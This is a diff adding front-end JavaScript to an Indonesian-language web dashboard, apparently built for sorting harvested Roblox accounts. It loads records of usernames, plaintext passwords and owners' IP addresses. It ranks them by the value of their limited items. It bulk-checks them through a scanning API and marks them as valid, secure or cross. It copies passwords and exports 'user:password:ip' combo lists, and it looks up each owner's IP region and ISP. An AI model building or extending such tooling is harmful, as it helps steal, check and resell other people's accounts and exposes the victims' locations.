@@ -957,7 +957,7 @@
       </div>
 
       <div class="ad-loc-card">
-        <div class="ad-loc-top" id="adLocTop">🌍 Unknown</div>
+        <div class="ad-loc-top" id="adLocTop">📍 Unknown</div>
         <div class="ad-loc-isp" id="adLocIsp">Memuat info ISP &amp; kota...</div>
       </div>
 
@@ -1001,5 +1001,479 @@
       </div>
     </div>
   </div>
+
+  <div class="toast" id="toast">Berhasil disalin!</div>
+
+  <script>
+    let rawData = [];
+    let statusMap = JSON.parse(localStorage.getItem('dyriee_statuses') || '{}');
+    let starsMap = JSON.parse(localStorage.getItem('dyriee_stars') || '{}');
+    let currentTab = 'active';
+    let selectedCountry = 'ALL';
+    let selectedItem = 'ALL';
+    let sortDesc = true;
+    let filterStarOnly = false;
+    let activeDetailUsn = null;
+    let activeDetailIp = "-";
+
+    function mapAccountList(arr) {
+      return (arr || []).map((item, idx) => ({
+        id: idx + 1,
+        usn: item.usn || item.name || "Unknown",
+        name: item.name || item.usn || "Unknown",
+        pw: item.pass || item.pw || "-",
+        ip: item.ip || "-",
+        country: item.location || item.country || "Unknown",
+        rap: Number(item.total_rap || 0),
+        bundleValue: Number(item.bundle_value || 0),
+        limiteds: item.limited_found || [],
+        limitedItems: item.limited_items || [],
+        is_private: !!item.is_private,
+        has_verified: !!item.has_verified,
+        is_banned: !!item.is_banned,
+        avatar: item.avatar_url || ""
+      }));
+    }
+
+    function init() {
+      const bName = localStorage.getItem('dyriee_batch_name');
+      const subEl = document.getElementById('batchSubtitle');
+      if (bName && subEl) subEl.innerText = bName;
+
+      const localScanned = localStorage.getItem('dyriee_scanned_json');
+      if (localScanned) {
+        try {
+          rawData = mapAccountList(JSON.parse(localScanned));
+        } catch (e) {
+          rawData = [];
+        }
+      }
+      renderAll();
+    }
+
+    async function rescanAllInBrowser() {
+      if (!rawData.length) { alert("Belum ada data akun!"); return; }
+      const btn = document.getElementById('btnRescan');
+      btn.disabled = true;
+
+      let updated = [];
+      for (let i = 0; i < rawData.length; i += 15) {
+        const chunk = rawData.slice(i, i + 15).map(a => ({ usn: a.usn, pass: a.pw, ip: a.ip }));
+        btn.innerText = `⏳ Memindai ${Math.min(i + 15, rawData.length)} / ${rawData.length} akun...`;
+
+        try {
+          const res = await fetch('/api/scan', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ accounts: chunk })
+          });
+          if (!res.ok) throw new Error("HTTP " + res.status);
+          const data = await res.json();
+          updated = updated.concat(data.results || []);
+        } catch (err) {
+          alert("Error saat scan: " + err.message);
+          btn.disabled = false;
+          btn.innerText = "⚡ Scan Semua Akun di Web (Email & RAP)";
+          return;
+        }
+      }
+
+      localStorage.setItem('dyriee_scanned_json', JSON.stringify(updated));
+      rawData = mapAccountList(updated);
+      renderAll();
+      btn.disabled = false;
+      btn.innerText = "⚡ Scan Semua Akun di Web (Email & RAP)";
+      showToast("Semua akun selesai dipindai!");
+    }
+
+    function renderAll() {
+      renderStats();
+      renderFilters();
+      renderList();
+    }
+
+    function renderStats() {
+      let valid = 0, invalid = 0, secure = 0, cross = 0, priv = 0;
+      let totalRap = 0, totalBundleVal = 0, headless = 0, korblox = 0, maliv = 0, hasMail = 0;
+
+      rawData.forEach(a => {
+        const st = statusMap[a.usn] || 'active';
+        if (st === 'valid') valid++;
+        if (st === 'invalid') invalid++;
+        if (st === 'secure') secure++;
+        if (st === 'cross') cross++;
+        if (a.is_private) priv++;
+        if (a.has_verified) hasMail++;
+        totalRap += (a.rap || 0);
+        totalBundleVal += (a.bundleValue || 0);
+
+        const limsLower = (a.limiteds || []).map(x => x.toLowerCase());
+        if (limsLower.some(x => x.includes("headless"))) headless++;
+        if (limsLower.some(x => x.includes("korblox"))) korblox++;
+        if (limsLower.some(x => x.includes("malivinius"))) maliv++;
+      });
+
+      const fmtK = n => n >= 1000 ? (n / 1000).toFixed(1).replace(/\.0$/, "") + "K" : n.toLocaleString();
+      const checkedCount = valid + invalid + secure + cross;
+
+      document.getElementById('statTotal').innerText = rawData.length;
+      document.getElementById('statSub').innerText = `${checkedCount} dicek · ${rawData.length - checkedCount} belum · ${priv} private`;
+      document.getElementById('statTotalRap').innerText = fmtK(totalRap);
+      document.getElementById('statBundleSub').innerText = `+ nilai bundle ${fmtK(totalBundleVal)} (bukan RAP)`;
+
+      document.getElementById('statValidDetail').innerText = valid;
+      document.getElementById('statInvalidDetail').innerText = invalid;
+      document.getElementById('statSecureDetail').innerText = secure;
+      document.getElementById('statCrossDetail').innerText = cross;
+      document.getElementById('statHeadless').innerText = headless;
+      document.getElementById('statKorblox').innerText = korblox;
+      document.getElementById('statMalivinius').innerText = maliv;
+      document.getElementById('statHasMail').innerText = hasMail;
+
+      const cActive = document.getElementById('cntActive');
+      const cValid = document.getElementById('cntValid');
+      const cInvalid = document.getElementById('cntInvalid');
+      const cSecure = document.getElementById('cntSecure');
+      const cCross = document.getElementById('cntCross');
+      if (cActive) cActive.innerText = rawData.filter(a => (statusMap[a.usn] || 'active') === 'active').length;
+      if (cValid) cValid.innerText = valid;
+      if (cInvalid) cInvalid.innerText = invalid;
+      if (cSecure) cSecure.innerText = secure;
+      if (cCross) cCross.innerText = cross;
+    }
+
+    function renderFilters() {
+      const countryCounts = {};
+      const itemMap = {};
+
+      rawData.forEach(a => {
+        const c = a.country || "Unknown";
+        countryCounts[c] = (countryCounts[c] || 0) + 1;
+
+        if (a.limitedItems && a.limitedItems.length > 0) {
+          a.limitedItems.forEach(it => {
+            if (!itemMap[it.name]) itemMap[it.name] = { count: 0, rap: it.rap || 0 };
+            itemMap[it.name].count += 1;
+            if ((it.rap || 0) > itemMap[it.name].rap) itemMap[it.name].rap = it.rap;
+          });
+        } else {
+          (a.limiteds || []).forEach(l => {
+            if (!itemMap[l]) itemMap[l] = { count: 0, rap: 0 };
+            itemMap[l].count += 1;
+          });
+        }
+      });
+
+      const countries = Object.keys(countryCounts).sort((a, b) => countryCounts[b] - countryCounts[a]);
+      document.getElementById('countryCountBadge').innerText = `${countries.length} NEGARA ${document.getElementById('countryBody').classList.contains('open') ? '⌄' : '›'}`;
+
+      const cSearch = (document.getElementById('searchCountry').value || '').toLowerCase();
+      let cHtml = `<div class="acc-item ${selectedCountry === 'ALL' ? 'selected' : ''}" onclick="selectCountry('ALL')"><span>Semua Negara</span><span>${rawData.length}</span></div>`;
+      countries.filter(c => c.toLowerCase().includes(cSearch)).forEach(c => {
+        cHtml += `<div class="acc-item ${selectedCountry === c ? 'selected' : ''}" onclick="selectCountry('${c.replace(/'/g, "\'")}')"><span>${c}</span><span>${countryCounts[c]}</span></div>`;
+      });
+      document.getElementById('countryList').innerHTML = cHtml;
+
+      const items = Object.keys(itemMap).sort((a, b) => (itemMap[b].rap - itemMap[a].rap) || (itemMap[b].count - itemMap[a].count));
+      document.getElementById('itemCountBadge').innerText = `${items.length} ITEM ${document.getElementById('itemBody').classList.contains('open') ? '⌄' : '›'}`;
+
+      const iSearch = (document.getElementById('searchItem').value || '').toLowerCase();
+      let iHtml = `<div class="acc-item ${selectedItem === 'ALL' ? 'selected' : ''}" onclick="selectItem('ALL')"><span>Semua Item</span><span>${rawData.length} akun</span></div>`;
+      items.filter(it => it.toLowerCase().includes(iSearch)).forEach(it => {
+        const info = itemMap[it];
+        const rapLabel = info.rap > 0 ? `<span style="color:var(--cream); font-family:monospace; font-weight:700; margin-right:8px;">${info.rap.toLocaleString()}</span>` : '';
+        iHtml += `<div class="acc-item ${selectedItem === it ? 'selected' : ''}" onclick="selectItem('${it.replace(/'/g, "\'")}')"><span>${it}</span><span>${rapLabel}${info.count} akun</span></div>`;
+      });
+      document.getElementById('itemList').innerHTML = iHtml;
+    }
+
+    function renderList() {
+      const q = (document.getElementById('searchInput').value || '').toLowerCase();
+      let filtered = rawData.filter(a => {
+        const st = statusMap[a.usn] || 'active';
+        if (st !== currentTab) return false;
+        if (filterStarOnly && !starsMap[a.usn]) return false;
+        if (selectedCountry !== 'ALL' && a.country !== selectedCountry) return false;
+        if (selectedItem !== 'ALL' && !(a.limiteds || []).includes(selectedItem)) return false;
+        if (q) {
+          const matchStr = `${a.usn} ${a.name} ${a.ip} ${a.country} ${(a.limiteds || []).join(' ')}`.toLowerCase();
+          if (!matchStr.includes(q)) return false;
+        }
+        return true;
+      });
+
+      filtered.sort((a, b) => sortDesc ? (b.rap - a.rap) : (a.rap - b.rap));
+      const container = document.getElementById('accountList');
+
+      if (filtered.length === 0) {
+        container.innerHTML = `<div style="text-align:center; padding: 36px 20px; color: var(--muted); font-size: 13px;">Tidak ada akun yang cocok dengan filter ini.</div>`;
+        return;
+      }
+
+      container.innerHTML = filtered.slice(0, 100).map(acc => {
+        const st = statusMap[acc.usn] || 'active';
+        const isStarred = !!starsMap[acc.usn];
+        const avatarHtml = acc.avatar
+          ? `<img src="${acc.avatar}" loading="lazy" alt="">`
+          : `<div class="avatar-placeholder">${acc.usn.slice(0, 2).toUpperCase()}</div>`;
+
+        const limsLower = (acc.limiteds || []).map(x => x.toLowerCase());
+        const hasKorblox = limsLower.some(x => x.includes("korblox"));
+        const hasHeadless = limsLower.some(x => x.includes("headless"));
+        const hasMaliv = limsLower.some(x => x.includes("malivinius"));
+        const hasValk = limsLower.some(x => x.includes("valkyrie"));
+        const hasDom = limsLower.some(x => x.includes("dominus"));
+        const hasAnyBundle = hasKorblox || hasHeadless || hasMaliv || hasValk || hasDom;
+
+        let badgeParts = [];
+        if (acc.has_verified) badgeParts.push('<span class="tag-badge mail">MAIL</span>');
+        if (hasHeadless) badgeParts.push('<span class="tag-badge headless">H</span>');
+        if (hasKorblox) badgeParts.push('<span class="tag-badge korblox">K</span>');
+        if (hasMaliv) badgeParts.push('<span class="tag-badge maliv">MALIV</span>');
+        if (hasValk) badgeParts.push('<span class="tag-badge valk">VALK</span>');
+        if (hasDom) badgeParts.push('<span class="tag-badge dom">DOM</span>');
+
+        const badgeHtml = badgeParts.length > 0 ? `<div class="acc-badges">${badgeParts.join('')}</div>` : '';
+        const bundleText = hasAnyBundle ? ` &nbsp;💎 Bundle` : '';
+        const rapText = acc.is_private
+          ? `<span style="color:#f87171;">🔒 Private</span>`
+          : `<span style="color:var(--cream); font-weight:700;">🪙 ${acc.rap.toLocaleString()}</span>`;
+
+        return `
+        <div class="acc-card">
+          <div class="acc-top" onclick="showDetail(${acc.id})">
+            <div class="avatar-box">${avatarHtml}</div>
+            <div class="acc-info">
+              <div class="acc-display">${acc.name}</div>
+              <div class="acc-usn">@${acc.usn}</div>
+              <div class="acc-meta-row">${rapText}${bundleText} &nbsp;📍 ${acc.country} &nbsp;🌐 ${acc.ip}</div>
+              ${badgeHtml}
+            </div>
+            <button class="btn-star ${isStarred ? 'starred' : ''}" onclick="event.stopPropagation(); toggleStar('${acc.usn}')">${isStarred ? '★' : '☆'}</button>
+          </div>
+          <div class="copy-row">
+            <button class="btn-copy-usn" onclick="copyText('${acc.usn}', 'Username disalin!')">📋 Salin USN</button>
+            <button class="btn-copy-pw" onclick="copyText('${acc.pw.replace(/'/g, "\'")}', 'Password disalin!')">🔑 Salin PW</button>
+          </div>
+          <div class="status-grid">
+            <button class="st-btn valid ${st === 'valid' ? 'selected' : ''}" onclick="setStatus('${acc.usn}', 'valid')"><span>✓</span>VALID</button>
+            <button class="st-btn invalid ${st === 'invalid' ? 'selected' : ''}" onclick="setStatus('${acc.usn}', 'invalid')"><span>✕</span>INVALID</button>
+            <button class="st-btn secure ${st === 'secure' ? 'selected' : ''}" onclick="setStatus('${acc.usn}', 'secure')"><span>🛡</span>SECURE</button>
+            <button class="st-btn cross ${st === 'cross' ? 'selected' : ''}" onclick="setStatus('${acc.usn}', 'cross')"><span>⚠</span>CROSS</button>
+          </div>
+        </div>`;
+      }).join('');
+    }
+
+    function toggleDetail() {
+      const grid = document.getElementById('detailGrid');
+      const btn = document.getElementById('detailToggleBtn');
+      grid.classList.toggle('open');
+      btn.innerText = grid.classList.contains('open') ? 'TUTUP ^' : 'DETAIL ⌄';
+    }
+
+    function toggleAccordion(type) {
+      document.getElementById(type + 'Body').classList.toggle('open');
+      renderFilters();
+    }
+
+    function selectCountry(c) { selectedCountry = c; renderFilters(); renderList(); }
+    function selectItem(it) { selectedItem = it; renderFilters(); renderList(); }
+
+    function setTab(tab, el) {
+      currentTab = tab;
+      document.querySelectorAll('.pill').forEach(p => p.classList.remove('active'));
+      el.classList.add('active');
+      renderList();
+    }
+
+    function setStatus(usn, newStatus) {
+      statusMap[usn] = (statusMap[usn] === newStatus) ? 'active' : newStatus;
+      localStorage.setItem('dyriee_statuses', JSON.stringify(statusMap));
+      renderStats();
+      renderList();
+    }
+
+    function toggleStar(usn) {
+      if (starsMap[usn]) delete starsMap[usn];
+      else starsMap[usn] = true;
+      localStorage.setItem('dyriee_stars', JSON.stringify(starsMap));
+      renderList();
+    }
+
+    function toggleSort() {
+      sortDesc = !sortDesc;
+      showToast(sortDesc ? "Urut: RAP Tertinggi" : "Urut: RAP Terendah");
+      renderList();
+    }
+
+    function toggleStarFilter() {
+      filterStarOnly = !filterStarOnly;
+      showToast(filterStarOnly ? "Hanya menampilkan Favorit" : "Menampilkan semua akun");
+      renderList();
+    }
+
+    function downloadFiltered() {
+      const filtered = rawData.filter(a => (statusMap[a.usn] || 'active') === currentTab);
+      if (!filtered.length) { alert("Tidak ada akun di tab ini."); return; }
+      const txt = filtered.map(a => `${a.usn}:${a.pw}:${a.ip}`).join('\n');
+      const blob = new Blob([txt], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = `dyriee_${currentTab}_${filtered.length}.txt`;
+      link.click();
+    }
+
+    function copyText(text, msg) {
+      if (navigator.clipboard) navigator.clipboard.writeText(text);
+      showToast(msg);
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.innerText = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 1800);
+    }
+
+    function closeAccDetail() {
+      document.getElementById("accDetailOverlay").classList.remove("open");
+      activeDetailUsn = null;
+    }
+
+    function copyAdIp() {
+      if (!activeDetailIp || activeDetailIp === "-") return;
+      copyText(activeDetailIp, "IP disalin!");
+    }
+
+    function saveAdNote() {
+      if (!activeDetailUsn) return;
+      const notes = JSON.parse(localStorage.getItem("dyriee_notes") || "{}");
+      notes[activeDetailUsn] = document.getElementById("adNoteInput").value;
+      localStorage.setItem("dyriee_notes", JSON.stringify(notes));
+      showToast("Catatan disimpan!");
+    }
+
+    function toggleAdFav() {
+      if (!activeDetailUsn) return;
+      toggleStar(activeDetailUsn);
+      const isFav = !!starsMap[activeDetailUsn];
+      const btn = document.getElementById("adFavBtn");
+      btn.classList.toggle("active", isFav);
+      btn.innerText = isFav ? "★ Favorit" : "☆ Favorit";
+    }
+
+    function refreshAdStatusButtons(usn) {
+      const st = statusMap[usn] || "active";
+      document.getElementById("adStValid").classList.toggle("on", st === "valid");
+      document.getElementById("adStInvalid").classList.toggle("on", st === "invalid");
+      document.getElementById("adStSecure").classList.toggle("on", st === "secure");
+      document.getElementById("adStCross").classList.toggle("on", st === "cross");
+    }
+
+    function setAdStatus(st) {
+      if (!activeDetailUsn) return;
+      setStatus(activeDetailUsn, st);
+      refreshAdStatusButtons(activeDetailUsn);
+    }
+
+    async function showDetail(id) {
+      const acc = rawData.find(a => String(a.id) === String(id) || a.usn === String(id));
+      if (!acc) return;
+
+      const usn = acc.usn;
+      activeDetailUsn = usn;
+      activeDetailIp = acc.ip || "-";
+
+      document.getElementById("adAvatar").src = acc.avatar || "";
+      document.getElementById("adUsn").innerText = "@" + acc.usn;
+
+      const pill = document.getElementById("adMailPill");
+      if (acc.has_verified) {
+        pill.className = "ad-pill mail";
+        pill.innerText = "verif mail";
+      } else {
+        pill.className = "ad-pill nomail";
+        pill.innerText = "unverified";
+      }
+
+      document.getElementById("adRap").innerText = (acc.rap || 0).toLocaleString();
+      document.getElementById("adItemCount").innerText = (acc.limitedItems || []).length;
+      document.getElementById("adIp").innerText = acc.ip || "-";
+      document.getElementById("adLocTop").innerText = "📍 " + (acc.country || "Unknown");
+      document.getElementById("adLocIsp").innerText = "Memuat detail region, kota & ISP...";
+
+      const notes = JSON.parse(localStorage.getItem("dyriee_notes") || "{}");
+      document.getElementById("adNoteInput").value = notes[usn] || "";
+
+      const isFav = !!starsMap[usn];
+      const favBtn = document.getElementById("adFavBtn");
+      favBtn.classList.toggle("active", isFav);
+      favBtn.innerText = isFav ? "★ Favorit" : "☆ Favorit";
+
+      document.getElementById("adCopyUsnBtn").onclick = () => copyText(acc.usn, "USN disalin!");
+      document.getElementById("adCopyPwBtn").onclick = () => copyText(acc.pw, "PW disalin!");
+      refreshAdStatusButtons(usn);
+
+      document.getElementById("adWearCount").innerText = "";
+      document.getElementById("adBadgeCount").innerText = "";
+      document.getElementById("adGroupCount").innerText = "";
+      document.getElementById("adWearList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat item yang sedang dipakai...</div>';
+      document.getElementById("adBadgeList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat badge...</div>';
+      document.getElementById("adGroupList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat group...</div>';
+
+      document.getElementById("accDetailOverlay").classList.add("open");
+
+      try {
+        const res = await fetch("/api/detail", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usn: acc.usn, ip: acc.ip })
+        });
+        if (!res.ok) throw new Error("HTTP " + res.status);
+        const data = await res.json();
+        if (activeDetailUsn !== usn) return;
+
+        const ipi = data.ip_info || {};
+        const locParts = [ipi.country || acc.country, ipi.region, ipi.city].filter(Boolean);
+        document.getElementById("adLocTop").innerText = "📍 " + (locParts.join(" · ") || "Unknown");
+        document.getElementById("adLocIsp").innerText = ipi.isp || "-";
+
+        const wear = data.wearing || [];
+        document.getElementById("adWearCount").innerText = wear.length + " item";
+        if (wear.length > 0) {
+          document.getElementById("adWearList").innerHTML = wear.map(w =>
+            `<div class="ad-item-card"><img class="ad-item-thumb" src="${w.image || ''}" alt=""><div class="ad-item-name">${w.name}</div></div>`
+          ).join("");
+        } else {
+          document.getElementById("adWearList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Tidak ada aksesoris terpasang.</div>';
+        }
+
+        const badges = data.badges || [];
+        document.getElementById("adBadgeCount").innerText = badges.length + " badge";
+        if (badges.length > 0) {
+          document.getElementById("adBadgeList").innerHTML = badges.map(b =>
+            `<div class="ad-item-card"><img class="ad-item-thumb" src="${b.image || ''}" alt=""><div class="ad-item-name">${b.name}</div></div>`
+          ).join("");
+        } else {
+          document.getElementById("adBadgeList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Tidak ada badge atau inventory private.</div>';
+        }
+
+        const groups = data.groups || [];
+        document.getElementById("adGroupCount").innerText = groups.length + " group";
+        if (groups.length > 0) {
+          document.getElementById("adGroupList").innerHTML = groups.map(g =>
+            `<div class="ad-group-row"><div><div class="ad-group-name">${g.name}</div><div class="ad-group-meta">${(g.members || 0).toLocaleString()} members</div></div><span class="ad-group-role">${g.role}</span></div>`
+          ).join("");
+        } else {
+          document.getElementById("adGroupList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Tidak bergabung di group manapun.</div>';
+        }
+      } catch (err) {
+        document.getElementById("adLocIsp").innerText = "Gagal memuat detail tambahan.";
+      }
+    }
+
+    init();
+  </script>
 </body>
 </html>
